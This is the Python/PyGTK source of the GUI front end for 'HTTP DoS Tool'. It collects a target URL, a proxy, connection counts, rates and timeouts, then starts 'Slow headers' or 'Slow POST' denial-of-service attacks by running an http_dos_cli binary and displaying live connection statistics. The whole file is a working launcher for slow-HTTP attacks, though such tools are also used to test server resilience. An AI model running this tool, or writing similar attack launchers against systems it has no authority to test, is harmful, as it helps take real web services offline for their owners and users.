#!/usr/bin/env python

# Copyright (c) 2010, PROACTIVE RISK - http://www.proactiverisk.com
#
# This file is part of HTTP DoS Tool.
#
# HTTP Dos Tool is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option) any
# later version.
#
# Foobar is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with
# HTTP DoS Tool.  If not, see <http://www.gnu.org/licenses/>.


import pygtk
pygtk.require('2.0')
import gobject
import gtk
import pango

import os
import subprocess
import sys
import urlparse
import time
import threading

if sys.platform == 'win32':
  import win32process

def win32_link_button_handler(button, uri):
  os.startfile(uri)

# ----------------------------------------------------------------------------
def cli_thread_main(gui, attack_info, end_lock):
  
  def parse_line(line):
    if line.startswith('CONNECTIONS:'):
      try:
        fields = line.strip().split(' ')
        (target, started, active, connected, error, startup_fail) = [
            int(x) for x in fields if x.isdigit()]

        gobject.idle_add(gui.cli_thread_connection_info,
            (target, started, active, connected, error, startup_fail))
      except Exception, e:
        print 'Internal error:', str(e), line.strip()
    elif line.startswith('FINISHED'):
      # This will be handled later
      pass
    elif (line.startswith('WRITE:') or
          line.startswith('READ:') or
          line.startswith('EVENT_CONNECTING:') or
          line.startswith('EVENT_CONNECTED:') or
          line.startswith('EVENT_DISCONNECTED:')):
      gobject.idle_add(gui.cli_thread_diag_line, line.strip())
    else:
      # Unknown. Nothing sensible to do here, really?
      pass

  def check_end():
    end_lock.acquire()
    end = gui.cli_thread_should_end
    end_lock.release()
    return end

  def build_cmd_line():
    c = [] 
    for exe_location in ['.', '../build/src', 'build/src']:
      exe_name = os.path.join(exe_location, 'http_dos_cli')
      if sys.platform == 'win32':
        exe_name += '.exe'

      if os.path.exists(exe_name):
        c = [exe_name]
        break

    if len(c) == 0:
      raise Exception('Cannot find location of http_dos_cli application.')      

    # Update the GUI 4 times every second.
    c.append('--report-interval=0.250')
    
    netloc = attack_info['url'].netloc
    if netloc.find(':') != -1:
      (netloc, port) = netloc.split(':')
      c.append('--port=%s' % port)

    c.append('--host=%s' % netloc)
    c.append('--path=%s' % attack_info['url'].path)

    if attack_info['proxy_url']:
      netloc = attack_info['proxy_url'].netloc
      
      if netloc.find(':') != -1:
        (netloc, port) = netloc.split(':')
        c.append('--proxy-port=%s' % port)

      c.append('--proxy=%s' % netloc)

    c.append('--connections=%d' % attack_info['connections'])
    c.append('--rate=%d' % attack_info['conn_rate'])
    c.append('--timeout=%f' % attack_info['timeout'])

    if attack_info['timeout_randomise']:
      c.append('--random-timeout')

    if attack_info['user_agent']:
      c.append('--user-agent=%s' % attack_info['user_agent'])

    if attack_info['diagnostics']:
      # Just diagnose the first connection
      c.append('--log-connection=1')

    if attack_info['attack_type'] == GUI.ATTACK_TYPE_SLOW_HEADERS:
      c.append('--slow-headers')
      if attack_info['sh_use_post']:
        c.append('--post')
    elif attack_info['attack_type'] == GUI.ATTACK_TYPE_SLOW_POST:
      c.append('--slow-post')
      if attack_info['sp_content_length']:
        c.append('--post-content-length=%d' % attack_info['sp_content_length'])
      if attack_info['sp_content_length_randomise']:
        c.append('--random-post-content-length')
      if attack_info['sp_field']:
        c.append('--post-field=%s' % attack_info['sp_field'])
      if attack_info['sp_randomise_payload']:
        c.append('--random-payload')

    return c

  try:
    popen_args = {
        'stdin': open(os.devnull, 'w'),
        'stdout': subprocess.PIPE,
        'stderr': subprocess.STDOUT,
        'bufsize': 1
        }
    if sys.platform == 'win32':
      popen_args.update({'creationflags': win32process.CREATE_NO_WINDOW})

    process = subprocess.Popen(build_cmd_line(), **popen_args)

    # Just check that we've started OK
    if process.poll():
      raise Exception('Process gone away?')

    while True:
      if check_end():
        break

      line = process.stdout.readline()
      if not line:
        # EOF
        break
      parse_line(line)
      #print 'got line', line

    try:
      process.kill()
    except:
      pass

    process.wait()
    gobject.idle_add(gui.cli_thread_has_finished, ())
  except Exception, e:
    gobject.idle_add(gui.cli_thread_has_finished, ())
    gobject.idle_add(gui.cli_thread_error, str(e))

# ----------------------------------------------------------------------------
# GUI

class GUI(object):
  RESPONSE_CANCEL_ATTACK = 1000
  ATTACK_TYPE_SLOW_HEADERS, ATTACK_TYPE_SLOW_POST = ('Slow headers', 'Slow POST')

  def __init__(self):
    self.attack_info = {}
    self.cli_thread = None
    self.max_connections_active = 0
    self.max_connections_startup_fail = 0
    self.cli_end_lock = threading.Lock()

    builder = gtk.Builder()
    builder.add_from_file('interface.glade')
    builder.connect_signals(self)
    
    # ----
    # Main window
    self.window = builder.get_object('main_window')
    self.window.connect('delete-event', gtk.main_quit)

    self.quit_button = builder.get_object('quit_button')
    self.quit_button.connect('clicked', gtk.main_quit)

    self.link_button = builder.get_object('link_button')
    label = self.link_button.get_children()[0]
    label.set_markup('<small>PROACTIVE RISK</small>')

    self.url_entry = builder.get_object('url_entry')
    self.proxy_entry = builder.get_object('proxy_entry')
    self.connections_entry = builder.get_object('connections_entry')
    self.connection_rate_entry = builder.get_object('connection_rate_entry')
    self.timeout_entry = builder.get_object('timeout_entry')
    self.timeout_randomise_checkbox = builder.get_object('timeout_randomise_checkbox')
    self.user_agent_entry = builder.get_object('user_agent_entry')
    self.diagnostics_checkbutton = builder.get_object('diagnostics_checkbutton')

    self.attack_specific_parameters_alignment = builder.get_object(
        'attack_specific_parameters_alignment')

    hbox = builder.get_object('attack_type_hbox')
    self.attack_type_combobox = gtk.combo_box_new_text() 
    self.attack_type_combobox.append_text(self.ATTACK_TYPE_SLOW_HEADERS)
    self.attack_type_combobox.append_text(self.ATTACK_TYPE_SLOW_POST)
    self.attack_type_combobox.set_active(0)
    self.attack_type_combobox.connect('changed',
        self.on_attack_type_combobox_changed)
    hbox.pack_start(self.attack_type_combobox, False, False, 0)

    # Attack-specific parameters: slow headers
    self.slow_headers_parameter_table = builder.get_object(
        'slow_headers_parameter_table')
    self.slow_headers_use_post_checkbutton = builder.get_object(
        'slow_headers_use_post_checkbutton')

    # Attack-specific parameters: slow post
    self.slow_post_parameter_table = builder.get_object(
        'slow_post_parameter_table')
    self.post_content_length_entry = builder.get_object(
        'post_content_length_entry')
    self.post_content_length_randomise_checkbutton = builder.get_object(
        'post_content_length_randomise_checkbutton')
    self.post_field_entry = builder.get_object(
        'post_field_entry')
    self.post_randomise_payload_checkbutton = builder.get_object(
        'post_randomise_payload_checkbutton')

    # ----
    # Attack dialog
    self.attack_dialog = builder.get_object('run_attack_dialog')
    self.attack_dialog.connect('delete-event', self.attack_dialog.hide_on_delete)

    self.attack_dialog_type_val_label = builder.get_object('type_val_label')
    self.attack_dialog_protocol_val_label = builder.get_object('protocol_val_label')
    self.attack_dialog_host_val_label = builder.get_object('host_val_label')
    self.attack_dialog_path_val_label  = builder.get_object('path_val_label')

    self.target_dialog_target_connections_label = builder.get_object(
        'target_connections_label')
    self.attack_dialog_active_connections_label = builder.get_object(
        'active_connections_label')
    self.attack_dialog_connected_connections_label = builder.get_object(
        'connected_connections_label')
    self.attack_dialog_disconnected_connections_label = builder.get_object(
        'disconnected_connections_label')
    self.attack_dialog_create_error_connections_label = builder.get_object(
        'create_error_connections_label')

    self.attack_dialog_diagnostics_textview = builder.get_object(
        'diagnostics_textview')

    text_buf = self.attack_dialog_diagnostics_textview.get_buffer()
    text_buf.create_tag('red-bg', background='#f66')
    text_buf.create_tag('green-bg', background='#6f6')
    text_buf.create_tag('bold-wrap',
        weight=pango.WEIGHT_BOLD,
        wrap_mode=gtk.WRAP_WORD)
    text_buf.create_tag('wrap', wrap_mode=gtk.WRAP_WORD)

    self.attack_dialog_cancel_button = builder.get_object('cancel_attack_button')

    # ----
    if sys.platform == 'win32':
      gtk.link_button_set_uri_hook(win32_link_button_handler)
    self.update_attack_specific_parameters()
    self.window.show_all()

  def update_attack_specific_parameters(self):
    for child in self.attack_specific_parameters_alignment.get_children():
      self.attack_specific_parameters_alignment.remove(child)

    if self.attack_type_combobox.get_active() == 0:
      if self.slow_headers_parameter_table.get_parent():
        self.slow_headers_parameter_table.reparent(
            self.attack_specific_parameters_alignment)
      else:
        self.attack_specific_parameters_alignment.add(
            self.slow_headers_parameter_table)
    else:
      if self.slow_post_parameter_table.get_parent():
        self.slow_post_parameter_table.reparent(
            self.attack_specific_parameters_alignment)
      else:
        self.attack_specific_parameters_alignment.add(
            self.slow_post_parameter_table)

  def validate_input(self):
    attack_type = self.attack_type_combobox.get_active_text()
    connections_str = self.connections_entry.get_text()
    url_str = self.url_entry.get_text()
    proxy_str = self.proxy_entry.get_text()
    conn_rate_str = self.connection_rate_entry.get_text()
    timeout_str = self.timeout_entry.get_text()
    timeout_randomise = self.timeout_randomise_checkbox.get_active()
    user_agent_str = self.user_agent_entry.get_text()
    diagnostics_enable = self.diagnostics_checkbutton.get_active()

    try:
      connections = int(connections_str)
    except ValueError, e:
      raise Exception('Please specifiy the number of connections.\n\nThe value '
          'entered "<b>%s</b>" is not an integer.' % connections_str)

    if connections < 0 or connections > 40000:
      raise Exception('Please specify a number of connections greater than 0 '
          'and less than or equal to 40000.')

    url = urlparse.urlparse(url_str)
    if not url.scheme:
      url.scheme = 'http'
    if url.scheme != 'http':
      raise Exception('Please enter a URL of a web server to attack.\n'
          'Example "http://example.com".\n\n'
          'The text entered "<b>%s</b>" resulted in a scheme of "%s", but '
          'only "http" is supported.' % (url_str, url.scheme))
    if not url.netloc:
      raise Exception('Please enter a URL of a web server to attack.\n'
          'Example "http://example.com".\n\n'
          'The text entered "<b>%s</b>" is not a valid URL.' % url_str)

    proxy_url = ''
    if proxy_str.strip():
      proxy_url = urlparse.urlparse(proxy_str)

      if proxy_url.scheme != 'http':
        raise Exception('Please enter a correctly formatted proxy URL or '
            'delete the current one.\n'
            'The text entered "<b>%s</b>" resulted in a scheme of "%s", but '
            'only "http" is supported.' % (proxy_str, proxy_url.scheme))
      if not proxy_url.netloc:
        raise Exception('The proxy specified is not a valid URL. Please enter '
            'a correctly formatted URL or delete the current one.\n'
            'The text entered "<b>%s</b>" is not a valid URL.' % proxy_str)
      if proxy_url.path and proxy_url.path != '/':
        raise Exception('The proxy specified contains a path, but this is '
            'not allowed.\n'
            'The URL entered for the proxy is "<b>%s</b>" which resulted in '
            'a path of "<b>%s</b>".\n'
            'Please enter a proxy URL without a path component.' %
            (proxy_str, proxy_url.path))

    try:
      conn_rate = int(conn_rate_str)
    except ValueError, e:
      raise Exception('Please specify the connection rate.\n\nThe value '
          'entered "<b>%s</b>" is not an integer.' % conn_rate_str)

    if conn_rate < 0 or conn_rate > 10000:
      raise Exception('Please specify a connection rate greater than 0 '
          'and less than or equal to 10000.')

    try:
      timeout = float(timeout_str)
    except ValueError, e:
      raise Exception('Please specify the timeout.\n\n'
          'The value entered "<b>%s</b>" is not a real number.' % timeout_str)

    user_agent = user_agent_str.strip()
    if len(user_agent) == 0:
      raise Exception('Please specify the user agent.\n\n'
          'There was no value entered or it is empty.')

    sh_use_post = False
    sp_content_length = 0
    sp_content_length_randomise = False
    sp_field = ''
    sp_randomise_payload = False

    if attack_type == self.ATTACK_TYPE_SLOW_HEADERS:
      sh_use_post = self.slow_headers_use_post_checkbutton.get_active()
    elif attack_type == self.ATTACK_TYPE_SLOW_POST:
      sp_content_length_str = self.post_content_length_entry.get_text()
      sp_content_length_randomise = \
          self.post_content_length_randomise_checkbutton.get_active()
      sp_post_field_entry_str = self.post_field_entry.get_text()
      sp_randomise_payload = \
          self.post_randomise_payload_checkbutton.get_active()
      
      try:
        sp_content_length = int(sp_content_length_str)
      except ValueError, e:
        raise Exception('Please specify a POST content length.\n\n'
            'The value entered "<b>%s</b>" is not an integer.' %
            sp_content_length_str)
      if sp_content_length < 1 or sp_content_length > 2000000000:
        raise Exception('Please specify a POST content length in the range '
            '1-2000000000.\n\nThe value entered %d is not in this range.' %
            sp_content_length)
    
      sp_field = sp_post_field_entry_str.strip()

    # Passed validation so we'll set up our attack_info dict:
    self.attack_info['attack_type'] = attack_type
    self.attack_info['connections'] = connections
    self.attack_info['url']         = url
    self.attack_info['proxy_url']   = proxy_url
    self.attack_info['conn_rate']   = conn_rate
    self.attack_info['timeout']     = timeout
    self.attack_info['timeout_randomise'] = timeout_randomise
    self.attack_info['user_agent']  = user_agent
    self.attack_info['diagnostics'] = diagnostics_enable
    self.attack_info['sh_use_post'] = sh_use_post
    self.attack_info['sp_content_length'] = sp_content_length
    self.attack_info['sp_content_length_randomise'] = sp_content_length_randomise
    self.attack_info['sp_field']    = sp_field
    self.attack_info['sp_randomise_payload'] = sp_randomise_payload

  def show_error_dialog(self, error):
    error_dlg = gtk.MessageDialog(
        type=gtk.MESSAGE_ERROR,
        message_format=error,
        buttons=gtk.BUTTONS_OK)
    error_dlg.set_title('Error!')
    error_dlg.set_markup(error)
    error_dlg.run()
    error_dlg.destroy()

  def start_cli_thread(self):
    self.max_connections_active = 0
    self.max_connections_startup_fail = 0
    self.cli_thread_should_end = False
    self.cli_thread = threading.Thread(target=cli_thread_main,
        name='CLI controller thread',
        args=(self, self.attack_info, self.cli_end_lock))
    self.cli_thread.start()

  def cli_thread_connection_info(self, info):
    (target, started, active, connected, error, startup_fail) = info

    self.max_connections_active = max(self.max_connections_active,
                                      active)
    self.max_connections_startup_fail = max(self.max_connections_startup_fail,
                                            startup_fail)

    self.target_dialog_target_connections_label.set_text(str(target))
    self.attack_dialog_active_connections_label.set_text(str(active))
    self.attack_dialog_connected_connections_label.set_text(str(connected))
    self.attack_dialog_disconnected_connections_label.set_text(str(error))
    self.attack_dialog_create_error_connections_label.set_text(str(startup_fail))

  def cli_thread_has_finished(self, arg):
    self.cli_thread.join()
    self.cli_thread = None
    self.attack_dialog_cancel_button.set_label('OK')

    text_buf = self.attack_dialog_diagnostics_textview.get_buffer()
    tb_iter = text_buf.get_end_iter()

    text_buf.insert(tb_iter, '\nFinished.\n')

    tb_iter = text_buf.get_end_iter()
    text_buf.insert_with_tags_by_name(tb_iter,
        'Maximum number of concurrent connections '
        'active was %d.\n' %
        self.max_connections_active,
        'bold-wrap')

    if not self.max_connections_startup_fail:
      tb_iter = text_buf.get_end_iter()
      text_buf.insert_with_tags_by_name(tb_iter,
          'This may not be the system limit, you may '
          'be limited by your network and/or by the '
          'destination server or proxy.\n',
          'wrap')

    gobject.idle_add(gui.scroll_diagnostics_textview, ())

  def scroll_diagnostics_textview(self, arg):
    text_buf = self.attack_dialog_diagnostics_textview.get_buffer()
    tb_iter = text_buf.get_end_iter()
    self.attack_dialog_diagnostics_textview.scroll_to_iter(tb_iter, 0.0)

  def cli_thread_error(self, e):
    self.show_error_dialog('Running attack program failed: ' + str(e))

  def cli_thread_diag_line(self, line):
    text_buf = self.attack_dialog_diagnostics_textview.get_buffer()
    tb_iter = text_buf.get_end_iter()

    if line.startswith('READ:'):
      if line.startswith('READ:0'):
        text_buf.insert_with_tags_by_name(tb_iter, line[7:], 'green-bg')
      else:
        text_buf.insert_with_tags_by_name(tb_iter, line[7:] + '\n', 'green-bg')
    elif line.startswith('WRITE:'):
      if line.startswith('WRITE:0'):
        text_buf.insert_with_tags_by_name(tb_iter, line[8:], 'red-bg')
      else:
        text_buf.insert_with_tags_by_name(tb_iter, line[8:] + '\n', 'red-bg')
    else:
      if line.startswith('EVENT_CONNECTED:'):
        text_buf.insert(tb_iter, 'Connected.\n')
      elif line.startswith('EVENT_DISCONNECTED:'):
        text_buf.insert(tb_iter, 'Disconnected.\n')
      elif line.startswith('EVENT_CONNECTING:'):
        text_buf.insert(tb_iter, 'Connecting to %s ... ' % line.split()[1])

    gobject.idle_add(gui.scroll_diagnostics_textview, ())

  # --------------------------------------------------------------------------
  # Main window handler functions

  def on_run_attack_button_clicked(self, widget, data=None):
    # Need to wait for the CLI thread to finish :(
    if self.cli_thread:
      return

    try:
      self.validate_input()
    except Exception, e:
      self.show_error_dialog(str(e))
      return

    self.attack_dialog_type_val_label.set_text(self.attack_info['attack_type'])
    self.attack_dialog_protocol_val_label.set_text(self.attack_info['url'].scheme)
    self.attack_dialog_host_val_label.set_text(self.attack_info['url'].netloc)
    self.attack_dialog_path_val_label.set_text(self.attack_info['url'].path)

    self.target_dialog_target_connections_label.set_text('-')
    self.attack_dialog_active_connections_label.set_text('-')
    self.attack_dialog_connected_connections_label.set_text('-')
    self.attack_dialog_disconnected_connections_label.set_text('-')
    self.attack_dialog_create_error_connections_label.set_text('-')

    text_buf = self.attack_dialog_diagnostics_textview.get_buffer()
    if self.attack_info['diagnostics']:
      text_buf.set_text('Following connection 1...\n')
    else:
      text_buf.set_text('Diagnostics not enabled.')
    self.attack_dialog_diagnostics_textview.set_size_request(-1, 100)

    self.attack_dialog_cancel_button.set_label('Cancel attack')

    self.start_cli_thread()

    response_id = self.attack_dialog.run()

    self.attack_dialog.hide()

    self.cli_end_lock.acquire()
    self.cli_thread_should_end = True
    self.cli_end_lock.release()
    
  def on_attack_type_combobox_changed(self, widget):
    self.update_attack_specific_parameters()

  # --------------------------------------------------------------------------
  # Attack dialog handler functions

  def on_cancel_attack_button_clicked(self, widget):
    self.attack_dialog.response(self.RESPONSE_CANCEL_ATTACK)


if __name__ == '__main__':
  gtk.gdk.threads_init()
  gui = GUI()
  gtk.main()